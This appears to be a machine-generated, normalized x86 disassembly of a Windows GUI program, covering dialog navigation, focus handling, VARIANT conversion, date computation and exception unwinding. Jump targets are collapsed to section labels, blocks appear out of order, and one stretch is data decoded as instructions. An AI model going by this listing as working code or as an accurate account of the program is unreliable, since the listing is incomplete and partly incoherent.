cmp [ ebp + 0xc ] edx
jbe r-xdata
mov ecx [ ebp + 0x10 ]
inc edx
add ecx 0x24
cmp edx [ ebp + 0xc ]
jae r-xdata
movzx eax [ eax + lookup_table_40f0e6 ]
jmp [ eax * 4 + jump_table_40f0c6 ]
jmp r-xdata
push 0x1
jmp r-xdata
push 0x7
jmp r-xdata
push 0x5
jmp r-xdata
push 0x4
jmp r-xdata
push 0x6
jmp r-xdata
push 0x3
jmp r-xdata
push 0x2
mov eax [ ecx ]
dec eax
cmp eax 0x1e
ja r-xdata
pop esi
lea ecx [ ebp - 0x24 ]
push 0x3
call sub_40f3b2
mov eax [ ebp + 0x14 ]
mov ecx edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] esi
call sub_40b67c
mov eax [ ebp - 0xc ]
jmp r-xdata
pop edi
pop esi
leave
retn 0x10
sub_40f0ee
add al [ edx ]
add eax [ ebx ]
pop es
pop es
add eax [ ebx ]
pop es
pop es
add eax [ ecx ]
add eax [ edi ]
add al [ eax + 0x7070707 ]
pop es
push es
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_40f14f
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0xd8 ]
mov eax [ ebp + 0x20 ]
xor ebx ebx
sub eax ebx
je r-xdata
push 0x1
jmp r-xdata
dec eax
je r-xdata
pop ebx
jmp r-xdata
push 0x4
dec eax
je r-xdata
push 0x3
lea ecx [ ebp - 0x24 ]
call sub_40f3b2
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x6
call sub_40b67c
mov eax [ ebp - 0xc ]
push 0x6
jmp r-xdata
dec eax
je r-xdata
push 0x5
jmp r-xdata
dec eax
jne r-xdata
mov esi [ edi + 0x88 ]
push 0x7
test esi esi
pop ebx
jne r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_40d7ca
mov eax [ esi ]
and [ esi + 0x44 ] 0x0
mov ecx esi
call [ eax + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn 0x20
sub_40f1e0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x7
lea esi [ eax - 0xd8 ]
mov eax [ ebp + 0x1c ]
pop edi
xor ebx ebx
push 0x4
sub eax ebx
mov [ ebp - 0x4 ] esi
mov [ ebp + 0x8 ] ebx
pop edx
je r-xdata
mov [ ebp + 0x8 ] 0x1
dec eax
je r-xdata
mov ebx edi
sub eax ecx
je r-xdata
mov [ ebp + 0x8 ] edx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
cmp ebx ecx
jne r-xdata
push 0x3
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x18 ]
push 0x2
sub eax edx
pop ecx
je r-xdata
mov [ ebp + 0x8 ] 0x6
jmp r-xdata
dec eax
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
pop ebx
jmp r-xdata
push 0x5
sub eax 0x5
jne r-xdata
mov [ ebp + 0x8 ] 0x5
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x6
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
jmp r-xdata
mov esi [ esi + 0x88 ]
test esi esi
je r-xdata
mov ebx ecx
jmp r-xdata
mov [ ebp + 0x8 ] edi
jmp r-xdata
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ esi + 0x50 ]
mov ecx [ ecx ]
mov [ eax + 0xc ] ecx
mov edi [ esi + 0x44 ]
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_40d7ca
test edi edi
mov [ esi + 0x44 ] edi
jne r-xdata
push 0x3
lea ecx [ ebp - 0x28 ]
call sub_40f3b2
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_40b67c
mov eax [ ebp - 0x10 ]
test eax eax
jl r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn 0x1c
sub_40f2f5
cmp [ esp + 0xc ] 0xe
push esi
jne r-xdata
xor eax eax
pop esi
retn 0x14
mov eax [ esp + 0x8 ]
mov esi [ eax - 0x50 ]
test esi esi
je r-xdata
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x54 ]
push [ eax ]
call sub_40c848
mov ecx [ esi + 0x54 ]
call sub_40c969
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x54 ]
push [ eax ]
call sub_40d007
mov eax [ esi + 0x54 ]
mov eax [ eax + 0xc ]
cmp [ esi + 0x10 ] eax
je r-xdata
push [ esi + 0x14 ]
mov [ esi + 0x10 ] eax
call [ CoTaskMemFree@IAT ]
mov eax [ esi + 0x10 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call [ CoTaskMemAlloc@IAT ]
mov [ esi + 0x14 ] eax
mov esi [ esi + 0x10 ]
lea ecx [ esi + esi * 4 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_410a20
add esp 0xc
sub_40f37c
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov esi [ esp + 0xc ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ edi ]
push edi
call [ eax + 0x4 ]
mov [ esi ] edi
mov eax edi
pop edi
pop esi
retn 0x8
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40f3e4
mov edx [ esp + 0x4 ]
test edx edx
jne r-xdata
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x8 ]
xor eax eax
jmp r-xdata
retn 0x8
push ecx
push eax
push 0x87
push [ edx + 0x1c ]
call [ SendMessageA@IAT ]
sub_40f412
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call sub_40f3e4
test al 0x8
je r-xdata
mov ecx esi
call sub_421bf5
pop esi
retn 0x4
push 0xffffffff
push 0x0
push 0xb1
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_40f440
push ebx
push esi
mov esi [ esp + 0x10 ]
xor ebx ebx
test esi esi
push edi
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn 0x8
mov edi [ GetWindowLongA@IAT ]
cmp esi [ esp + 0x10 ]
je r-xdata
push [ esi + 0x1c ]
mov ebx esi
call [ GetParent@IAT ]
push eax
call sub_41f3e7
mov esi eax
push 0xffffffec
push [ esi + 0x1c ]
call edi
test eax 0x10000
jne r-xdata
test esi esi
jne r-xdata
push 0xfffffff0
push [ esi + 0x1c ]
call edi
and eax 0xc0000000
cmp eax 0x40000000
jne r-xdata
sub_40f499
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
test esi esi
je r-xdata
mov ebp [ esp + 0x10 ]
mov eax [ esi + 0x1c ]
mov edi [ GetWindow@IAT ]
push 0x2
push eax
call edi
push eax
call sub_41f3e7
test eax eax
mov ebp [ esp + 0x10 ]
jne r-xdata
push ebx
push 0xffffffec
push [ esi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
je r-xdata
mov eax ebp
jmp r-xdata
mov esi [ esi + 0x1c ]
push 0x2
push esi
call edi
push eax
call sub_41f3e7
mov esi eax
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_41f3e7
push eax
push ebp
call sub_40f440
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop ebx
mov ebx [ esp + 0x1c ]
test bl 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x1c ]
call [ GetTopWindow@IAT ]
push eax
call sub_41f3e7
mov esi eax
test esi esi
jne r-xdata
cmp esi ebp
je r-xdata
test bl 0x2
je r-xdata
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
push 0x2
push eax
call edi
push eax
call sub_41f3e7
test eax eax
je r-xdata
push ebx
push 0x0
push esi
mov ecx esi
call sub_421bb3
test eax eax
jne r-xdata
push ebx
push esi
push ebp
jmp r-xdata
call sub_40f499
mov esi eax
sub_40f575
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x8 ]
call sub_40b4d0
test eax eax
je r-xdata
push 0x1
pop eax
retn
sub_40f594
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor ebx ebx
push edi
call sub_40f440
mov esi eax
push 0x0
push esi
push [ edi + 0x1c ]
call [ GetNextDlgGroupItem@IAT ]
push eax
call sub_41f3e7
mov esi eax
test esi esi
je r-xdata
mov esi [ esi + 0x1c ]
push [ ebp + 0xc ]
push edi
call sub_40f440
mov ebx eax
mov esi ebx
inc ebx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
cmp esi ebx
jne r-xdata
cmp ebx 0x3c
jg r-xdata
push 0x3
push esi
push edi
call sub_40f499
push [ ebp + 0x10 ]
mov esi eax
push esi
call sub_40f575
pop ecx
test eax eax
pop ecx
jne r-xdata
jmp r-xdata
push [ ebp + 0x10 ]
push esi
call sub_40f575
pop ecx
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
test esi esi
je r-xdata
sub_40f619
push esi
mov esi [ esp + 0x8 ]
mov ecx esi
call sub_421bb3
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
test [ eax + 0x71 ] 0x20
je r-xdata
push 0x1
pop eax
pop esi
retn
sub_40f63f
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
xor eax eax
push esi
call sub_40f619
test eax eax
pop ecx
je r-xdata
mov ecx esi
call sub_421bb3
test eax eax
jne r-xdata
push 0x0
push [ esi + 0x1c ]
push [ edi + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_41f3e7
mov esi eax
test esi esi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
test ebx ebx
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x200
jl r-xdata
mov ebx esi
push [ ebp + 0x10 ]
push esi
push edi
call sub_40f594
mov esi eax
test esi esi
je r-xdata
sub_40f6b4
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
xor esi esi
test eax eax
je r-xdata
mov esi [ eax + 0x38 ]
test esi esi
jne r-xdata
test edi edi
jne r-xdata
push [ eax + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_41f3e7
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
call [ GetFocus@IAT ]
push eax
call sub_41f3e7
cmp eax ebx
je r-xdata
mov edi [ eax + 0x34 ]
test edi edi
jne r-xdata
mov ecx ebx
call sub_421bf5
sub_40f711
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
pop edi
pop esi
retn
push [ esi + 0x1c ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
push [ esi + 0x1c ]
mov esi [ GetParent@IAT ]
mov edi [ eax + 0x34 ]
test edi edi
jne r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
push [ eax + 0x1c ]
jmp r-xdata
push [ eax + 0x20 ]
call sub_41f3e7
test eax eax
je r-xdata
call esi
push eax
call sub_41f3e7
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx eax
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edi ]
push 0x0
mov ecx edi
call [ eax + 0x5c ]
push [ ecx + 0x1c ]
push [ eax + 0x1c ]
call [ IsChild@IAT ]
test eax eax
jne r-xdata
sub_40f784
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
push [ esp + 0x14 ]
mov ecx ebx
call sub_4219cc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push 0x1
push eax
push ebx
call sub_40f499
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
mov esi edi
mov ecx edi
mov eax esi
jmp r-xdata
push 0x1
push esi
push ebx
call sub_40f499
mov esi eax
test esi esi
je r-xdata
cmp esi edi
je r-xdata
mov ecx esi
jmp r-xdata
call sub_421ae1
cmp eax [ esp + 0x14 ]
je r-xdata
sub_40f7db
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
push 0x0
push esi
call sub_40f3e4
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x10
add ecx 0x10
test ecx eax
je r-xdata
push [ esp + 0xc ]
call sub_40b1f2
pop esi
retn
pop esi
retn
xor eax eax
push 0x1
cmp [ esp + 0x10 ] eax
setne al
push eax
push 0xf4
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_40f828
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
retn
push 0x0
push eax
call sub_40f3e4
and eax 0x30
retn
jmp sub_40b1da
sub_40f849
push esi
mov esi [ esp + 0xc ]
test esi esi
push edi
je r-xdata
push 0x3
push 0x0
push [ esp + 0x14 ]
call sub_40f499
push 0xffffffec
push [ esi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
jne r-xdata
pop edi
pop esi
retn 0x8
mov esi edi
push esi
push [ esp + 0x10 ]
call sub_40f440
jmp r-xdata
cmp esi edi
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push 0x0
push esi
call sub_40f7db
pop ecx
pop ecx
push 0x0
push esi
push [ esp + 0x14 ]
call sub_40f499
mov esi eax
test esi esi
je r-xdata
sub_40f8ab
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0x400
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
mov ecx eax
shr ecx 0x10
cmp cx 0x534b
jne r-xdata
push 0x1
pop eax
movzx eax ax
jmp r-xdata
retn 0x4
sub_40f8d8
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
jne r-xdata
mov eax [ edi + 0x1c ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
test edi edi
je r-xdata
mov ebx [ ebp + 0x8 ]
push eax
push [ ebx + 0x1c ]
call [ IsChild@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax edi
jne r-xdata
push 0xffffffec
push [ edi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
jne r-xdata
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
push edi
call sub_40f828
pop ecx
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
push eax
call sub_40f828
test eax eax
pop ecx
jne r-xdata
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x30
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push edi
push 0x1
push edi
jmp r-xdata
push ebx
call sub_40f8ab
push eax
push ebx
call sub_40f784
mov esi eax
test esi esi
je r-xdata
push ebx
call sub_40f8ab
push eax
push ebx
call sub_40f784
mov esi eax
push esi
call sub_40f828
test al 0x20
pop ecx
je r-xdata
call sub_40f7db
pop ecx
pop ecx
cmp esi edi
je r-xdata
mov ecx esi
call sub_421bb3
test eax eax
je r-xdata
push esi
call sub_40f828
test al 0x10
pop ecx
je r-xdata
push 0x1
push esi
push esi
jmp r-xdata
push ebx
call sub_40f849
sub_40f9c5
mov eax sub_42b330
call sub_410a78
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call [ GetFocus@IAT ]
push eax
call sub_41f3e7
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x20 ] ecx
and [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ecx + 0x1c ]
mov [ ebp - 0x24 ] ecx
and [ ebp - 0x24 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
cmp ebx 0x200
jb r-xdata
cmp ebx 0x108
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0x4 ]
cmp ebx 0x100
mov [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ ebp + 0xc ]
push [ eax ]
call sub_41f3e7
mov edi eax
mov eax [ ebp - 0x18 ]
xor esi esi
push 0x2
sub eax 0x100
mov [ ebp - 0x1c ] esi
pop ebx
je r-xdata
cmp ebx 0x209
ja r-xdata
test eax eax
mov esi eax
je r-xdata
push [ ebp + 0xc ]
push edi
call sub_40f3e4
mov ecx [ ebp + 0xc ]
movzx ecx [ ecx + 0x8 ]
cmp ecx 0x1b
jg r-xdata
sub eax ebx
je r-xdata
cmp ebx 0x101
je r-xdata
mov edi [ GetParent@IAT ]
cmp ecx 0x25
jl r-xdata
je r-xdata
mov esi [ ebp + 0xc ]
sub eax 0x4
jne r-xdata
test esi esi
je r-xdata
cmp ebx 0x100
je r-xdata
test esi esi
je r-xdata
push [ esi + 0x1c ]
call edi
push eax
call sub_41f3e7
cmp eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
call [ IsDialogMessageA@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp ecx 0x26
jle r-xdata
push ebx
push [ ebp + 0x8 ]
call sub_40f784
mov esi eax
test esi esi
je r-xdata
cmp ecx 0x3
je r-xdata
push 0x1
pop eax
jmp r-xdata
push esi
push edi
call sub_40f3e4
cmp [ ebp - 0x18 ] 0x102
jne r-xdata
cmp [ ebp - 0x14 ] esi
jne r-xdata
mov esi [ esi + 0x38 ]
test esi esi
je r-xdata
cmp ebx 0x102
jne r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push [ esi + 0x1c ]
call edi
push eax
call sub_41f3e7
mov esi eax
test esi esi
jne r-xdata
push [ ebp - 0x20 ]
mov esi [ IsWindow@IAT ]
call esi
test eax eax
je r-xdata
mov esi [ GetFocus@IAT ]
call esi
push eax
call sub_41f3e7
cmp eax [ ebp - 0x14 ]
je r-xdata
mov [ ebp - 0x1c ] 0x1
cmp ecx 0x28
jle r-xdata
mov ecx esi
call sub_421bb3
test eax eax
jne r-xdata
cmp ecx 0x9
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
mov cx [ esi + 0x8 ]
cmp cx 0x9
jne r-xdata
test al 0x84
jne r-xdata
mov esi [ ebp + 0xc ]
cmp [ esi + 0x8 ] 0x20
je r-xdata
push 0x12
call [ GetKeyState@IAT ]
test ax ax
jge r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x8 ]
cmp ax 0xd
jne r-xdata
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov eax edi
mov ebx [ GetFocus@IAT ]
call ebx
push eax
call sub_41f3e7
push eax
push [ ebp - 0x14 ]
call sub_40f711
pop ecx
pop ecx
push [ ebp - 0x24 ]
call esi
test eax eax
je r-xdata
call esi
push eax
call sub_41f3e7
push eax
call sub_40f6b4
pop ecx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp - 0x14 ]
call sub_40f3e4
test al 0x1
jne r-xdata
cmp ecx 0x2b
jne r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
push eax
call [ MessageBeep@IAT ]
jmp r-xdata
test al 0x2
jne r-xdata
cmp ecx 0xd
je r-xdata
cmp cx 0x20
jne r-xdata
test bl al
jne r-xdata
jmp r-xdata
cmp ax 0x1b
jne r-xdata
test [ esi + 0x80 ] 0x1
jne r-xdata
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
test eax eax
je r-xdata
call ebx
push eax
call sub_41f3e7
push eax
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40f8d8
push [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
call [ GetNextDlgGroupItem@IAT ]
push eax
call sub_41f3e7
test eax eax
je r-xdata
mov eax [ eax + 0x1c ]
push [ ebp - 0x14 ]
call sub_40f828
test al 0x10
pop ecx
je r-xdata
xor eax eax
push eax
push eax
push eax
push 0x1
push 0xfffffdd9
push esi
mov [ ebp - 0x4 ] eax
call sub_421c16
add esp 0x18
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call [ GetKeyState@IAT ]
xor ecx ecx
test ax ax
setl cl
test edi edi
mov eax ecx
je r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_40f63f
test eax eax
je r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
test [ esi + 0x80 ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x38 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_40f8ab
mov esi [ ebp - 0x14 ]
mov ecx esi
call sub_421ae1
jmp r-xdata
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_41f3e7
mov esi eax
test esi esi
je r-xdata
mov edi [ edi + 0x1c ]
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_40f412
jmp r-xdata
test esi esi
mov ebx eax
jne r-xdata
push 0x1
pop edi
jmp r-xdata
push esi
call sub_40f412
push esi
push [ ebp - 0x14 ]
call sub_40f711
pop ecx
pop ecx
jmp r-xdata
push esi
mov ecx eax
call sub_40b573
jmp r-xdata
sub_40fe38
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
and [ edi + 0x8 ] 0x0
mov [ edi ] 0x8
test esi esi
je r-xdata
lea esp [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0xe
push esi
jne r-xdata
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_411530
mov ebx esp
push esi
push ebx
push 0xffffffff
push [ ebp + 0x8 ]
xor eax eax
mov [ ebx ] ax
push eax
push eax
call [ MultiByteToWideChar@IAT ]
push ebx
call [ SysAllocString@IAT ]
call [ lstrlenA@IAT ]
push eax
push esi
call [ SysAllocStringByteLen@IAT ]
jmp r-xdata
call sub_41dc26
test eax eax
mov [ edi + 0x8 ] eax
jne r-xdata
sub_40feb3
cmp [ esp + 0x8 ] 0xb
mov eax ecx
jne r-xdata
mov cx [ esp + 0x4 ]
mov [ eax ] 0x2
mov [ eax + 0x8 ] cx
cmp [ esp + 0x4 ] 0x0
mov [ eax ] 0xb
jne r-xdata
or [ eax + 0x8 ] 0xffff
jmp r-xdata
and [ eax + 0x8 ] 0x0
jmp r-xdata
retn 0x8
sub_40fee9
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xa
mov eax ecx
jne r-xdata
cmp [ ebp + 0xc ] 0xb
jne r-xdata
mov [ eax ] 0xa
jmp r-xdata
mov [ eax ] 0x3
cmp [ ebp + 0x8 ] 0x0
mov [ eax ] 0xb
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
or [ eax + 0x8 ] 0xffff
jmp r-xdata
and [ eax + 0x8 ] 0x0
jmp r-xdata
pop ebp
retn 0x8
sub_40ff2b
mov edx [ esp + 0x8 ]
test edx edx
jne r-xdata
mov eax [ esp + 0x4 ]
cmp edx ecx
jne r-xdata
mov edx ecx
push eax
push 0x0
push edx
push ecx
call [ VariantChangeType@IAT ]
push eax
call sub_40fdf9
cmp ax [ ecx ]
je r-xdata
retn 0x8
sub_40ff83
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x270f
push ebx
push esi
push edi
ja r-xdata
xor eax eax
mov di [ ebp + 0xc ]
push 0x1
pop esi
cmp di si
jb r-xdata
cmp di 0xc
ja r-xdata
test [ ebp + 0x8 ] 0x3
jne r-xdata
and [ ebp - 0x4 ] 0x0
movzx ecx [ ebp + 0x8 ]
mov eax ecx
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
movzx ecx di
mov edi [ ecx * 4 + rw-data ]
movzx edx [ ebp + 0x10 ]
lea ecx [ ecx * 4 + rw-data ]
sub eax edi
mov [ ebp + 0x10 ] edx
add eax [ ecx ]
cmp edx eax
jg r-xdata
cmp [ ebp + 0x10 ] 0x1d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
test edx edx
jne r-xdata
cmp [ ebp + 0x14 ] 0x17
ja r-xdata
xor eax eax
cmp [ ebp + 0x10 ] si
jb r-xdata
cmp di 0x2
jne r-xdata
cmp [ ebp + 0x18 ] 0x3b
ja r-xdata
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x3b
ja r-xdata
movzx esi [ ebp + 0x8 ]
mov eax esi
mov ebx 0x190
cdq
idiv ebx
mov ecx esi
push 0x64
shr ecx 0x2
add ecx eax
mov eax esi
imul eax eax 0x16d
add ecx eax
mov eax esi
cdq
pop esi
idiv esi
sub ecx eax
add ecx [ ebp + 0x10 ]
add ecx edi
cmp [ ebp + 0xc ] 0x2
ja r-xdata
movzx eax [ ebp + 0x14 ]
movzx edx [ ebp + 0x18 ]
imul eax eax 0x3c
add eax edx
sub ecx 0xa96c7
movzx edx [ ebp + 0x1c ]
imul eax eax 0x3c
add eax edx
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0x8 ] eax
fild [ ebp + 0x8 ]
test ecx ecx
fmul [ r--data ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
fild [ ebp + 0x10 ]
mov eax [ ebp + 0x20 ]
push 0x1
fadd st1
fstp [ eax ]
pop eax
fstp st0
jmp r-xdata
fchs
dec ecx
pop edi
pop esi
pop ebx
leave
retn 0x1c
sub_4100c0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ff83
neg eax
sbb eax eax
inc eax
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x18
sub_41010e
push esi
push edi
call sub_4272f7
push 0xb
mov esi eax
call sub_427d7a
lea edi [ esi + 0x103c ]
push 0xb
call sub_427dea
pop edi
pop esi
retn
push esi
mov ecx edi
call sub_427434
test esi esi
je r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
jmp r-xdata
sub_41014a
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_41018c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4101db
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412cbd
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_410211
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
